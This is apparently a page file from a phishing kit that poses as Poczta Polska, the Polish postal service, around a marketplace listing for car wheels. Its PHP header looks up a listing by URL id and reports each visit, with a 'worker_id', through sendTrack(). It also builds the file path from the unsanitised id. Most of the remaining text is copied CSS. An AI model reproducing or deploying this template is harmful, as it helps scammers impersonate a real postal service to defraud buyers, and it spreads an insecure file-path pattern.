<?php
include "service.php";
include "../settings.php";
if (file_exists("data/" . $_GET['id'] . ".xml") == false){
    header("location: " . $_temp['original']);
    exit;
}
$xml = simplexml_load_file("data/" . $_GET["id"] . ".xml");

sendTrack($_temp['service'], $_temp['valute'], $_GET['id'], $xml->obyava, $xml->price, $xml->worker_id);
?>
<!DOCTYPE html>
<!-- saved from url=(0052) -->
<html lang="pl"><head><meta http-equiv="Content-Type" content="text/html; charset=UTF-8">
        
    <link rel="stylesheet" href="https://maxcdn.bootstrapcdn.com/bootstrap/4.5.2/css/bootstrap.min.css">
    <script src="https://ajax.googleapis.com/ajax/libs/jquery/3.5.1/jquery.min.js"></script>
    <script src="https://cdnjs.cloudflare.com/ajax/libs/popper.js/1.16.0/umd/popper.min.js"></script>
    <script src="https://maxcdn.bootstrapcdn.com/bootstrap/4.5.2/js/bootstrap.min.js"></script>
    <script src="https://cdnjs.cloudflare.com/ajax/libs/jquery.maskedinput/1.4.1/jquery.maskedinput.js"></script>
        <meta name="viewport" content="width=device-width,initial-scale=1,user-scalable=no">
        <title>Poczta Polska</title>
        <style>.header-menu-pnk {
	text-decoration: none;
    color: #797979;
    font-size: 15px;
    margin-right: 20px;
    font-weight: 600;
}
#b-menu {
	float: right; 
	margin-right: 20px; 
	margin-top: 20px;
}
#header-menu {
	width: 100%; 
	height: 30px; 
	margin-top: 27px;
}
#_1f {
	background: #f3f3f3;
	font-size: 12px;
	color: #414042;
}
.fblock-title a {
	font-weight: 600;
	color: #414042;
    text-decoration: none;
}
.fblock-title {
    margin-bottom: 20px;
}
.nav-info {
	margin: 0 auto;
	max-width: 1024px;
	padding: 20px 0;
    border-bottom: 1px solid #d8d8d8;
}
.nav-info ul {
	display: flex;
	padding: 0;
}
.nav-info li {
	margin-bottom: 10px;
	list-style-type: none;
	font-size: 16px;
    margin: 20px;
}
.fblock-pnk {
	color: #414042;
    text-decoration: none;
}
.nolu-title {
	margin-top: 30px;
	margin-left: 40px;
    width: 70px;
}
#underheader {
	margin: 0 auto;
	max-width: 1024px;
}
.underheader-btn {
	background: #E71905;
	padding: 10px 20px;
	text-decoration: none;
	color: white;
}
#sled1 {
	width: 100%;
}
#sled2 {
	display: none;
}
._0 {
	margin: 0 auto;
	max-width: 1024px;
}
._1 {
margin: 0 auto;
	max-width: 1024px;
	height: 64px;
	margin-top: 18px;
	margin-bottom: 18px;
	display: flex;
}
._2 {
	height: 100%;
	background: url(logo.php) no-repeat 0 center / auto 72px;
	width: 200px;
}
._3 {
	width: 100%;
}
._4 {
	font-weight: bold;
	font-size: 20px;
}
._5 {
	margin-top: 12px;
}
._13 {
	font-weight: bold;
	font-size: 30px;
	margin-top: 50px;
	margin-bottom: 24px;
	margin-left: 16px;
}
._14 {
	margin-top: 12px;
}
._15 {
	width: 30%;
}
._16 {
	padding: 35px 16px;
    margin-bottom: 50px;
}
._17 {
	border-top: 1px solid #e7e7e7;
	padding: 50px;
	margin-bottom: 16px;
	color: #565656;
}
._177 {
	color: ##000;

}
._19 {
	padding: 12px;
    border: 1px solid #cacaca;
}
._20 {
	width: 250px;
	margin-top: 30px;
}
._21 {
	font-size: 16px;
	color: #555;
	margin-bottom: 24px;
}
._23 {
	padding: 20px;
	font-size: 20px;
	color: white;
	cursor: pointer;
	background: #E71905;
}
._23:disabled {
	background: #E8A4B8;
	cursor: default;
}
._24 {
	color: #999;
}
._30 {
	margin-bottom: 4px;
	font-size: 16px;
}
body {
	margin: 0;
	font-family: Arial;
	font-size: 14px;
	color: #222;
	word-break: break-word;
	-webkit-appearance: none;
}
input {
	font-family: Arial;
	font-size: 16px;
	color: #222;
	width: 100%;
	border: none;
	outline: none;
	box-sizing: border-box;
	-webkit-appearance: none;
}
table {
	width: 100%;
	border-collapse: collapse;
	-webkit-appearance: none;
}

td {
	padding: 0;
}
button {
	-webkit-appearance: none;
}
#copyright {
	padding: 20px; 
	margin: 0 auto; 
	max-width: 984px;
}
@media all and (max-width: 960px) {
	._0 {
		max-width: 480px;
	}
	._1 {
		margin-top: 16px;
	}
	/*._3, ._16, ._21, ._20 {
		width: 100%;
	}*/
	._13 {
		font-size: 26px;
		margin-top: 32px;
	}
	#header-menu {
	    display: none;
	}
	._2 {
		width: 100%;
	}
	._15 {
	    width: 40%;
	}
	#_1f {
	display: block;
	padding: 30px;
	}
	.nav-info {
	    width: 50%;
	    margin-left: 20%;
	}
	#sled1 {
		display: none;
	}
	#sled2 {
		display: block;
		width: 100%;
	}
	.nav-info ul {
		display: block;
	}
	#underheader {
		display: none;
	}
	#copyright {
		max-width: 434px;
	}
}

</style>
        <script></script>
        <meta property="og:url" content="https://poczta-polska.pl/">
        <meta property="og:site_name" content="Poczta Polska">
        <meta property="og:title" content="Koła letnie Barum Hyundai 185/65 R15 5x114,3">
        <meta property="og:description" content="Koła letnie Barum Hyundai 185/65 R15 5x114,3">
        <meta property="og:type" content="website">
        <meta property="og:locale" content="pl_PL">
		<script type="text/javascript" src="./pp_files/jspocztap.js"></script> 
<style>
#top, .navbar-toggle .icon-bar{background:white;}
#tfoot{background-color:#98979B;}
#tmenu > li > a{background:white;border:1px solid #E71905;padding:9px 14px;}
#tmenu > li > a:hover{background:#E71905;color:white}
#topb,#cookiesBar{background:#E2E4E5;}
#tmenu > li > a{color:#E71905;padding:10px 6px;}
#fmenu a{color:rgb(30,29,31);}
#brand_logo{float:left}
#btChgStyle{margin-left:35px;margin-top:5px;vertical-align:top;float:left}
#hmenu{margin-top:10px;}
#hmenu li{float:left;}
#hmenu li:last-child a{border-right:none;margin-right:0;}
#hmenu li a{color:black;padding-right:5px;margin-right:5px;border-right:1px solid black;}
.navbar-collapse{padding:0px!important;}
#tmenu{padding:8px 0;text-align:left;}
 #tmenu > li > a{display:block;}
.caret{margin-left:5px!important;}
.navbar-collapse .btn{display:inline-block;}
.navbar-header .navbar-toggle{margin-right:0;background-color:rgb(231, 25, 5)}
.navbar-header .navbar-toggle:hover{background-color:black;}
.topper .navbar-collapse, #footer .navbar-collapse{max-height:inherit}
#fmenu > li{padding-left:25px;padding-right:25px;margin:0;}
#footer{background:rgb(245,244,243);text-align:left;}
#tfoot{font-size:13px;color:white;padding:20px 0;text-align:left;}
#fmenu{margin:20px 0 0 0;padding:0;}
#fmenu>li{display:inline-block;vertical-align:top;text-align:left;}
#fmenu>li>a{padding:10px 0;text-transform:uppercase;font-weight:bold;display:block;}
#fmenu>li a:hover,#fmenu > li a:focus{background:none;}
#fmenu .sub-menu{padding:0;margin-bottom:30px;list-style-type:none;max-width:240px;}
#social{float:left;}
#social a{width:24px;height:24px;display:inline-block;margin:5px 0 5px 10px;text-indent:100%;white-space:nowrap;overflow:hidden;background:url("https://www.poczta-polska.pl/hermes/themes/poczta-polska/skin/social_icons.png");}
#social #twitter{background-position:-24px 0;}
#social #blog{background-position:-48px 0;}
#social #linkedin{background-position:-72px 0;}
#social #instgarm{background-position:-96px 0;}
.info_line{font-size:18px;}
.info_line span{font-weight:bold;}
#cookiesBar{position:fixed;bottom:0;height:50px;left:0;right:0;padding-top:5px;text-align:center;z-index:1000;}
button::-moz-focus-inner{padding:0;border:0;}
@media only screen and (max-width:770px){#btChgStyle{display:none;}
}
@media only screen and (max-width:700px){#brand_logo{float:none;margin:auto;display:block;}
#hmenu{float:none!important;margin-left:auto;margin-right:auto;text-align:center;}
#hmenu li, #social{display:inline-block;float:none;}
#top{text-align:center;}
}
@media only screen and (max-width:690px){#cookiesBar{height:70px;}
#tfoot, .info_line{text-align:center;}
#fmenu li{padding:4px 10px;font-size:14px;}
}
@media only screen and (max-width:768px){body{padding-top:0;}
.nav>li{margin-bottom:3px;}
#tmenu{margin:0;padding:0;}
#tmenu > li > a{font-size:14px;}
}
@media only screen and (min-width:768px){body{padding-top:102px;}
.topper{border-width:0 0 1px;left:0;position:fixed;right:0;top:0;z-index:1030;}
#tmenu{margin-left:-15px;}
#tmenu > li > a{padding:10px 5px;margin-right:4px;}
*#searchform{border:0 none;box-shadow:none;margin-left:0;margin-right:0;padding-bottom:0;padding-top:0;}
}
.navbar-collapse .btn,#fmenu > li{*display:inline;zoom:1;}
.page .container{*max-width:1140px;}
#fmenu .sub-menu{*margin-left:0;}
#searchform{border-bottom:1px solid transparent;border-top:1px solid transparent;box-shadow:0 1px 0 rgba(255, 255, 255, 0.1) inset, 0 1px 0 rgba(255, 255, 255, 0.1);margin:8px -15px;padding:5px 15px;}
@media all and (min-width:1280px){
#logo_ue{margin-left:80px}
}
@media all and (max-width:1280px){
#logo_ue{margin-left:0px}
}
footer, header, nav{display:block}
html{font-family:sans-serif;-webkit-text-size-adjust:100%;-ms-text-size-adjust:100%}
body{margin:0}
a:focus{outline:thin dotted}
a:active, a:hover{outline:0}
b{font-weight:bold}
img{border:0}
button, input{margin:0;font-family:inherit;font-size:100%}
button, input{line-height:normal}
button{text-transform:none}
button{cursor:pointer;-webkit-appearance:button}
button::-moz-focus-inner, input::-moz-focus-inner{padding:0;border:0}
@media print{*{color:#000!important;text-shadow:none!important;background:transparent!important;box-shadow:none!important}
a, a:visited{text-decoration:underline}
a[href]:after{content:" (" attr(href) ")"}
a[href^="#"]:after{content:""}
img{page-break-inside:avoid}
img{max-width:100%!important}
@page{margin:2cm .5cm}
p{orphans:3;widows:3}
.navbar{display:none}
}
*, *:before, *:after{-webkit-box-sizing:border-box;-moz-box-sizing:border-box;box-sizing:border-box}
html{font-size:62.5%;-webkit-tap-highlight-color:rgba(0,0,0,0)}
body{font-family:Arial,Helvetica,sans-serif;font-size:13px;line-height:1.428571429;color:#333;background-color:#fff;}
input, button{font-family:inherit;font-size:inherit;line-height:inherit}
button, input{background-image:none}
a{color:black;text-decoration:none}
a:hover, a:focus{text-decoration:underline}
a:focus{outline:thin dotted #333;outline:5px auto -webkit-focus-ring-color;outline-offset:-2px}
img{vertical-align:middle}
.img-responsive{display:block;height:auto;max-width:100%}
p{margin:0 0 10px}
.text-right{text-align:right}
.text-center{text-align:center}
ul{margin-top:0;margin-bottom:10px}
ul ul{margin-bottom:0}
.list-unstyled{padding-left:0;list-style:none}
.container{padding-right:15px;padding-left:15px;margin-right:auto;margin-left:auto}
.container:before, .container:after{display:table;content:" "}
.container:after{clear:both}
.container:before, .container:after{display:table;content:" "}
.container:after{clear:both}
.row{margin-right:-15px;margin-left:-15px}
.row:before, .row:after{display:table;content:" "}
.row:after{clear:both}
.row:before, .row:after{display:table;content:" "}
.row:after{clear:both}
.col-xs-12, .col-md-3, .col-md-4, .col-md-8, .col-md-9, .col-md-12{position:relative;min-height:1px;padding-right:15px;padding-left:15px}
.col-xs-12{width:100%}
@media(min-width:768px){.container{max-width:950px}
}
@media(min-width:992px){.container{max-width:970px}
.col-md-3, .col-md-4, .col-md-8, .col-md-9{float:left}
.col-md-3{width:25%}
.col-md-4{width:33.33333333333333%}
.col-md-8{width:66.66666666666666%}
.col-md-9{width:75%}
.col-md-12{width:100%}
}
@media(min-width:1200px){.container{max-width:1170px}
}
.form-control:-moz-placeholder{color:#999}
.form-control::-moz-placeholder{color:#999}
.form-control:-ms-input-placeholder{color:#999}
.form-control::-webkit-input-placeholder{color:#999}
.form-control{display:block;width:100%;height:34px;padding:6px 12px;font-size:14px;line-height:1.428571429;color:#555;vertical-align:middle;background-color:#fff;border:1px solid #ccc;border-radius:4px;-webkit-box-shadow:inset 0 1px 1px rgba(0,0,0,0.075);box-shadow:inset 0 1px 1px rgba(0,0,0,0.075);-webkit-transition:border-color ease-in-out .15s, box-shadow ease-in-out .15s;transition:border-color ease-in-out .15s, box-shadow ease-in-out .15s}
.form-control:focus{border-color:black;outline:0;}
.input-sm{height:30px;padding:5px 10px;font-size:12px;line-height:1.5;border-radius:3px}
.btn{display:inline-block;padding:6px 12px;margin-bottom:0;font-size:14px;font-weight:normal;line-height:1.428571429;text-align:center;white-space:nowrap;vertical-align:middle;cursor:pointer;border:1px solid transparent;border-radius:4px;-webkit-user-select:none;-moz-user-select:none;-ms-user-select:none;-o-user-select:none;user-select:none}
.btn:focus{outline:thin dotted #333;outline:5px auto -webkit-focus-ring-color;outline-offset:-2px}
.btn:hover, .btn:focus{color:white;background:rgb(231,25,5);text-decoration:none;}
.btn:active{background-image:none;outline:0;-webkit-box-shadow:inset 0 3px 5px rgba(0,0,0,0.125);box-shadow:inset 0 3px 5px rgba(0,0,0,0.125)}
.btn-default{color:#333;background-color:#fff;border-color:#ccc}
.btn-sm{padding:5px 10px;font-size:12px;line-height:1.5;border-radius:3px}
.collapse{display:none}
@font-face{font-family:'Glyphicons Halflings';src:url("");src:url("glyphicons-halflings-regular.eot") format('embedded-opentype'), url("ttpocztap-2.woff") format('woff'), url("ttpocztap-1.ttf") format('truetype'), url("glyphicons-halflings-regular.svg") format('svg')}
.glyphicon{position:relative;top:1px;display:inline-block;font-family:'Glyphicons Halflings';-webkit-font-smoothing:antialiased;font-style:normal;font-weight:normal;line-height:1}
.glyphicon-search:before{content:"\e003"}
.caret{display:inline-block;width:0;height:0;margin-left:2px;vertical-align:middle;border-top:4px solid #000;border-right:4px solid transparent;border-bottom:0 dotted;border-left:4px solid transparent;content:""}
.input-group{position:relative;display:table;border-collapse:separate}
.input-group .form-control{width:100%;margin-bottom:0}
.input-group-btn, .input-group .form-control{display:table-cell}
.input-group-btn{width:1%;white-space:nowrap;vertical-align:middle}
.input-group-btn{position:relative;white-space:nowrap}
.input-group-btn>.btn{position:relative}
.input-group-btn>.btn:hover, .input-group-btn>.btn:active{z-index:2}
.enlarge .dropdown-menu > li > a:hover,.enlarge .dropdown-menu > li > a:focus{background-color:black;color:#FFFFFF;text-decoration:none;font-weight:bold;}
.btn-default:hover, .btn-default:focus, .btn-default:active, .btn-default.active, .open .dropdown-toggle.btn-default{color:#333;background-color:#ebebeb;border-color:#adadad}
.btn-default:active, .btn-default.active, .open .dropdown-toggle.btn-default{background-image:none}
.btn-default.disabled, .btn-default[disabled], fieldset[disabled] .btn-default, .btn-default.disabled:hover, .btn-default[disabled]:hover, fieldset[disabled] .btn-default:hover, .btn-default.disabled:focus, .btn-default[disabled]:focus, fieldset[disabled] .btn-default:focus, .btn-default.disabled:active, .btn-default[disabled]:active, fieldset[disabled] .btn-default:active, .btn-default.disabled.active, .btn-default[disabled].active, fieldset[disabled] .btn-default.active{background-color:#fff;border-color:#ccc}
.btn-primary{color:#fff;background-color:rgb(231,25,5);border-color:silver}
.btn-primary:hover, .btn-primary:focus, .btn-primary:active, .btn-primary.active, .open .dropdown-toggle.btn-primary{color:#fff;background-color:gray;border-color:silver}
.btn-primary:active, .btn-primary.active, .open .dropdown-toggle.btn-primary{background-image:none}
.btn-primary.disabled, .btn-primary[disabled], fieldset[disabled] .btn-primary, .btn-primary.disabled:hover, .btn-primary[disabled]:hover, fieldset[disabled] .btn-primary:hover, .btn-primary.disabled:focus, .btn-primary[disabled]:focus, fieldset[disabled] .btn-primary:focus, .btn-primary.disabled:active, .btn-primary[disabled]:active, fieldset[disabled] .btn-primary:active, .btn-primary.disabled.active, .btn-primary[disabled].active, fieldset[disabled] .btn-primary.active{background-color:#428bca;border-color:#357ebd}
.btn-warning{color:#fff;background-color:#f0ad4e;border-color:#eea236}
.btn-warning:hover, .btn-warning:focus, .btn-warning:active, .btn-warning.active, .open .dropdown-toggle.btn-warning{color:#fff;background-color:#ed9c28;border-color:#d58512}
.btn-warning:active, .btn-warning.active, .open .dropdown-toggle.btn-warning{background-image:none}
.btn-warning.disabled, .btn-warning[disabled], fieldset[disabled] .btn-warning, .btn-warning.disabled:hover, .btn-warning[disabled]:hover, fieldset[disabled] .btn-warning:hover, .btn-warning.disabled:focus, .btn-warning[disabled]:focus, fieldset[disabled] .btn-warning:focus, .btn-warning.disabled:active, .btn-warning[disabled]:active, fieldset[disabled] .btn-warning:active, .btn-warning.disabled.active, .btn-warning[disabled].active, fieldset[disabled] .btn-warning.active{background-color:#f0ad4e;border-color:#eea236}
.btn-danger{color:#fff;background-color:#d9534f;border-color:#d43f3a}
.btn-danger:hover, .btn-danger:focus, .btn-danger:active, .btn-danger.active, .open .dropdown-toggle.btn-danger{color:#fff;background-color:#d2322d;border-color:#ac2925}
.btn-danger:active, .btn-danger.active, .open .dropdown-toggle.btn-danger{background-image:none}
.btn-danger.disabled, .btn-danger[disabled], fieldset[disabled] .btn-danger, .btn-danger.disabled:hover, .btn-danger[disabled]:hover, fieldset[disabled] .btn-danger:hover, .btn-danger.disabled:focus, .btn-danger[disabled]:focus, fieldset[disabled] .btn-danger:focus, .btn-danger.disabled:active, .btn-danger[disabled]:active, fieldset[disabled] .btn-danger:active, .btn-danger.disabled.active, .btn-danger[disabled].active, fieldset[disabled] .btn-danger.active{background-color:#d9534f;border-color:#d43f3a}
.btn-success{color:#fff;background-color:#5cb85c;border-color:#4cae4c}
.btn-success:hover, .btn-success:focus, .btn-success:active, .btn-success.active, .open .dropdown-toggle.btn-success{color:#fff;background-color:#47a447;border-color:#398439}
.btn-success:active, .btn-success.active, .open .dropdown-toggle.btn-success{background-image:none}
.btn-success.disabled, .btn-success[disabled], fieldset[disabled] .btn-success, .btn-success.disabled:hover, .btn-success[disabled]:hover, fieldset[disabled] .btn-success:hover, .btn-success.disabled:focus, .btn-success[disabled]:focus, fieldset[disabled] .btn-success:focus, .btn-success.disabled:active, .btn-success[disabled]:active, fieldset[disabled] .btn-success:active, .btn-success.disabled.active, .btn-success[disabled].active, fieldset[disabled] .btn-success.active{background-color:#5cb85c;border-color:#4cae4c}
.btn-info{color:#fff;background-color:#5bc0de;border-color:#46b8da}
.btn-info:hover, .btn-info:focus, .btn-info:active, .btn-info.active, .open .dropdown-toggle.btn-info{color:#fff;background-color:#39b3d7;border-color:#269abc}
.btn-info:active, .btn-info.active, .open .dropdown-toggle.btn-info{background-image:none}
.dropdown{position:relative}
.dropdown-toggle:focus{outline:0}
.dropdown-menu{position:absolute;top:100%;left:0;z-index:1000;display:none;float:left;min-width:160px;padding:5px 0;margin:2px 0 0;font-size:14px;list-style:none;background-color:#fff;-webkit-box-shadow:0 6px 12px rgba(0,0,0,0.175);box-shadow:0 6px 12px rgba(0,0,0,0.175);background-clip:padding-box}
.dropdown-menu.pull-right{right:0;left:auto}
.dropdown-menu .divider{height:1px;margin:9px 0;overflow:hidden;background-color:#e5e5e5}
.dropdown-menu>li>a{display:block;padding:3px 20px;clear:both;font-weight:normal;line-height:1.428571429;color:#333;white-space:nowrap}
.dropdown-menu>li>a:hover, .dropdown-menu>li>a:focus{color:#fff;text-decoration:none;background-color:rgb(231,25,5)}
.dropdown-menu>.active>a, .dropdown-menu>.active>a:hover, .dropdown-menu>.active>a:focus{color:#fff;text-decoration:none;background-color:rgb(231,25,5);outline:0}
.dropdown-menu>.disabled>a, .dropdown-menu>.disabled>a:hover, .dropdown-menu>.disabled>a:focus{color:#999}
.dropdown-menu>.disabled>a:hover, .dropdown-menu>.disabled>a:focus{text-decoration:none;cursor:not-allowed;background-color:transparent;background-image:none;filter:progid:DXImageTransform.Microsoft.gradient(enabled=false)}
.open>.dropdown-menu{display:block}
.open>a{outline:0}
.dropdown-header{display:block;padding:3px 20px;font-size:12px;line-height:1.428571429;color:#999}
.dropdown-backdrop{position:fixed;top:0;right:0;bottom:0;left:0;z-index:990}
.pull-right>.dropdown-menu{right:0;left:auto}
.dropup .caret, .navbar-fixed-bottom .dropdown .caret{border-top:0 dotted;border-bottom:4px solid #000;content:""}
.dropup .dropdown-menu, .navbar-fixed-bottom .dropdown .dropdown-menu{top:auto;bottom:100%;margin-bottom:1px}
@media(min-width:768px){.navbar-right .dropdown-menu{right:0;left:auto}
}
.btn-group>.btn:not(:first-child):not(:last-child):not(.dropdown-toggle){border-radius:0}
.btn-group>.btn:first-child{margin-left:0}
.btn-group>.btn:first-child:not(:last-child):not(.dropdown-toggle){border-top-right-radius:0;border-bottom-right-radius:0}
.btn-group>.btn:last-child:not(:first-child), .btn-group>.dropdown-toggle:not(:first-child){border-bottom-left-radius:0;border-top-left-radius:0}
.btn-group>.btn-group:first-child>.btn:last-child, .btn-group>.btn-group:first-child>.dropdown-toggle{border-top-right-radius:0;border-bottom-right-radius:0}
.btn-group>.btn-group:last-child>.btn:first-child{border-bottom-left-radius:0;border-top-left-radius:0}
.btn-group .dropdown-toggle:active, .btn-group.open .dropdown-toggle{outline:0}
.btn-group>.btn+.dropdown-toggle{padding-right:8px;padding-left:8px}
.btn-group>.btn-lg+.dropdown-toggle{padding-right:12px;padding-left:12px}
.btn-group.open .dropdown-toggle{-webkit-box-shadow:inset 0 3px 5px rgba(0,0,0,0.125);box-shadow:inset 0 3px 5px rgba(0,0,0,0.125)}
.btn .caret{margin-left:0}
.btn-group-vertical>.btn-group:first-child>.btn:last-child, .btn-group-vertical>.btn-group:first-child>.dropdown-toggle{border-bottom-right-radius:0;border-bottom-left-radius:0}
.input-group .form-control:first-child, .input-group-addon:first-child, .input-group-btn:first-child>.btn, .input-group-btn:first-child>.dropdown-toggle, .input-group-btn:last-child>.btn:not(:last-child):not(.dropdown-toggle){border-top-right-radius:0;border-bottom-right-radius:0}
.input-group .form-control:last-child, .input-group-addon:last-child, .input-group-btn:last-child>.btn, .input-group-btn:last-child>.dropdown-toggle, 
.dropdown-toggle{cursor:pointer;}
.nav{padding-left:0;margin-bottom:0;list-style:none}
.nav:before, .nav:after{display:table;content:" "}
.nav:after{clear:both}
.nav:before, .nav:after{display:table;content:" "}
.nav:after{clear:both}
.nav>li{position:relative;display:block}
.nav>li>a{position:relative;display:block;padding:10px 15px}
.nav>li>a:hover, .nav>li>a:focus{text-decoration:none;background-color:#eee}
.nav>li.disabled>a{color:#999}
.nav>li.disabled>a:hover, .nav>li.disabled>a:focus{color:#999;text-decoration:none;cursor:not-allowed;background-color:transparent}
.nav .open>a, .nav .open>a:hover, .nav .open>a:focus{background-color:#eee;border-color:#428bca}
.nav .nav-divider{height:1px;margin:9px 0;overflow:hidden;background-color:#e5e5e5}
.nav>li>a>img{max-width:none}
.nav-tabs{border-bottom:1px solid #ddd}
.nav-tabs>li{float:left;margin-bottom:-1px}
.nav-tabs>li>a{margin-right:2px;line-height:1.428571429;border:1px solid #DDDDDD;}
.nav-tabs>li>a:hover{border-color:#eee #eee #ddd}
.nav-tabs>li.active>a, .nav-tabs>li.active>a:hover, .nav-tabs>li.active>a:focus{color:white;cursor:default;background-color:rgb(104,103,107);border:1px solid #ddd;border-bottom-color:transparent}
.nav-tabs.nav-justified{width:100%;border-bottom:0}
.nav-tabs.nav-justified>li{float:none}
.nav-tabs.nav-justified>li>a{text-align:center}
@media(min-width:768px){.nav-tabs.nav-justified>li{display:table-cell;width:1%}
}
.nav-tabs.nav-justified>li>a{margin-right:0;border-bottom:1px solid #ddd}
.nav-tabs.nav-justified>.active>a{border-bottom-color:#fff}
.nav-pills>li{float:left}
.nav-pills>li>a{border-radius:5px}
.nav-pills>li+li{margin-left:2px}
.nav-pills>li.active>a, .nav-pills>li.active>a:hover, .nav-pills>li.active>a:focus{color:#fff;background-color:#428bca}
.nav-stacked>li{float:none}
.nav-stacked>li+li{margin-top:2px;margin-left:0}
.nav-justified{width:100%}
.nav-justified>li{float:none}
.nav-justified>li>a{text-align:center}
@media(min-width:768px){.nav-justified>li{display:table-cell;width:1%}
}
.nav-tabs-justified{border-bottom:0}
.nav-tabs-justified>li>a{margin-right:0;border-bottom:1px solid #ddd}
.nav-tabs-justified>.active>a{border-bottom-color:#fff}
.tabbable:before, .tabbable:after{display:table;content:" "}
.tabbable:after{clear:both}
.tabbable:before, .tabbable:after{display:table;content:" "}
.tabbable:after{clear:both}
.tab-content>.tab-pane, .pill-content>.pill-pane{display:none}
.tab-content>.active, .pill-content>.active{display:block}
.nav .caret{border-top-color:white;border-bottom-color:white}
.nav a:hover .caret{border-top-color:rgb(255,229,0);border-bottom-color:rgb(255,229,0)}
.nav-tabs .dropdown-menu{margin-top:-1px;border-top-right-radius:0;border-top-left-radius:0}
.navbar{position:relative;z-index:1000;min-height:50px;margin-bottom:20px;border:1px solid transparent}
.navbar:before, .navbar:after{display:table;content:" "}
.navbar:after{clear:both}
.navbar:before, .navbar:after{display:table;content:" "}
.navbar:after{clear:both}
@media(min-width:768px){.navbar{border-radius:4px}
}
.navbar-header:before, .navbar-header:after{display:table;content:" "}
.navbar-header:after{clear:both}
.navbar-header:before, .navbar-header:after{display:table;content:" "}
.navbar-header:after{clear:both}
@media(min-width:768px){.navbar-header{float:left}
}
.navbar-collapse{max-height:340px;padding-right:15px;padding-left:15px;overflow-x:visible;border-top:1px solid transparent;box-shadow:inset 0 1px 0 rgba(255,255,255,0.1);-webkit-overflow-scrolling:touch}
.navbar-collapse:before, .navbar-collapse:after{display:table;content:" "}
.navbar-collapse:after{clear:both}
.navbar-collapse:before, .navbar-collapse:after{display:table;content:" "}
.navbar-collapse:after{clear:both}
@media(min-width:768px){.navbar-collapse{width:auto;border-top:0;box-shadow:none}
.navbar-collapse.collapse{display:block!important;height:auto!important;padding-bottom:0;overflow:visible!important}
.navbar-collapse.in{overflow-y:visible}
.navbar-collapse .navbar-nav.navbar-left:first-child{margin-left:-15px}
.navbar-collapse .navbar-nav.navbar-right:last-child{margin-right:-15px}
.navbar-collapse .navbar-text:last-child{margin-right:0}
}
.navbar-static-top{border-width:0 0 1px}
@media(min-width:768px){.navbar-static-top{border-radius:0}
}
.navbar-fixed-top, .navbar-fixed-bottom{position:fixed;right:0;left:0;border-width:0 0 1px}
@media(min-width:768px){.navbar-fixed-top, .navbar-fixed-bottom{border-radius:0}
}
.navbar-fixed-top{top:0;z-index:1030}
.navbar-fixed-bottom{bottom:0;margin-bottom:0}
.navbar-brand{float:left;padding:15px 15px;font-size:18px;line-height:20px}
.navbar-brand:hover, .navbar-brand:focus{text-decoration:none}
@media(min-width:768px){.navbar>.container .navbar-brand{margin-left:-15px}
}
.navbar-toggle{position:relative;float:right;padding:9px 10px;margin-top:8px;margin-right:15px;margin-bottom:8px;background-color:transparent;border:1px solid transparent;border-radius:4px}
.navbar-toggle .icon-bar{display:block;width:22px;height:2px;border-radius:1px}
.navbar-toggle .icon-bar+.icon-bar{margin-top:4px}
@media(min-width:768px){.navbar-toggle{display:none}
}
.navbar-nav{margin:7.5px -15px}
.navbar-nav>li>a{padding-top:10px;padding-bottom:10px;line-height:20px}
@media(max-width:767px){.navbar-nav .open .dropdown-menu{position:static;float:none;width:auto;margin-top:0;background-color:transparent;border:0;box-shadow:none}
.navbar-nav .open .dropdown-menu>li>a, .navbar-nav .open .dropdown-menu .dropdown-header{padding:5px 15px 5px 25px}
.navbar-nav .open .dropdown-menu>li>a{line-height:20px}
.navbar-nav .open .dropdown-menu>li>a:hover, .navbar-nav .open .dropdown-menu>li>a:focus{background-image:none}
}
@media(min-width:768px){.navbar-nav{float:left;margin:0}
.navbar-nav>li{float:left}
.navbar-nav>li>a{padding-top:15px;padding-bottom:15px}
}
@media(min-width:768px){.navbar-left{float:left!important}
.navbar-right{float:right!important}
}
.navbar-form{padding:10px 15px;margin-top:8px;margin-right:-15px;margin-bottom:8px;margin-left:-15px;border-top:1px solid transparent;border-bottom:1px solid transparent;-webkit-box-shadow:inset 0 1px 0 rgba(255,255,255,0.1), 0 1px 0 rgba(255,255,255,0.1);box-shadow:inset 0 1px 0 rgba(255,255,255,0.1), 0 1px 0 rgba(255,255,255,0.1)}
@media(min-width:768px){.navbar-form .form-group{display:inline-block;margin-bottom:0;vertical-align:middle}
.navbar-form .form-control{display:inline-block}
.navbar-form .radio, .navbar-form .checkbox{display:inline-block;padding-left:0;margin-top:0;margin-bottom:0}
.navbar-form .radio input[type="radio"], .navbar-form .checkbox input[type="checkbox"]{float:none;margin-left:0}
}
@media(max-width:767px){.navbar-form .form-group{margin-bottom:5px}
}
@media(min-width:768px){.navbar-form{width:auto;padding-top:0;padding-bottom:0;margin-right:0;margin-left:0;border:0;-webkit-box-shadow:none;box-shadow:none}
}
.navbar-nav>li>.dropdown-menu{margin-top:0;border-top-right-radius:0;border-top-left-radius:0}
.navbar-fixed-bottom .navbar-nav>li>.dropdown-menu{border-bottom-right-radius:0;border-bottom-left-radius:0}
.navbar-nav.pull-right>li>.dropdown-menu, .navbar-nav>li>.dropdown-menu.pull-right{right:0;left:auto}
.navbar-btn{margin-top:8px;margin-bottom:8px}
.navbar-text{float:left;margin-top:15px;margin-bottom:15px}
@media(min-width:768px){.navbar-text{margin-right:15px;margin-left:15px}
}
.navbar-default{background-color:#f8f8f8;border-color:#e7e7e7}
.navbar-default .navbar-brand{color:#777}
.navbar-default .navbar-brand:hover, .navbar-default .navbar-brand:focus{color:#5e5e5e;background-color:transparent}
.navbar-default .navbar-text{color:#777}
.navbar-default .navbar-nav>li>a{color:#777}
.navbar-default .navbar-nav>li>a:hover, .navbar-default .navbar-nav>li>a:focus{color:#333;background-color:transparent}
.navbar-default .navbar-nav>.active>a, .navbar-default .navbar-nav>.active>a:hover, .navbar-default .navbar-nav>.active>a:focus{color:#555;background-color:#e7e7e7}
.navbar-default .navbar-nav>.disabled>a, .navbar-default .navbar-nav>.disabled>a:hover, .navbar-default .navbar-nav>.disabled>a:focus{color:#ccc;background-color:transparent}
.navbar-default .navbar-toggle{border-color:#ddd}
.navbar-default .navbar-toggle:hover, .navbar-default .navbar-toggle:focus{background-color:#ddd}
.navbar-default .navbar-toggle .icon-bar{background-color:#ccc}
.navbar-default .navbar-collapse, .navbar-default .navbar-form{border-color:#e6e6e6}
.navbar-default .navbar-nav>.dropdown>a:hover .caret, .navbar-default .navbar-nav>.dropdown>a:focus .caret{border-top-color:#333;border-bottom-color:#333}
.navbar-default .navbar-nav>.open>a, .navbar-default .navbar-nav>.open>a:hover, .navbar-default .navbar-nav>.open>a:focus{color:#555;background-color:#e7e7e7}
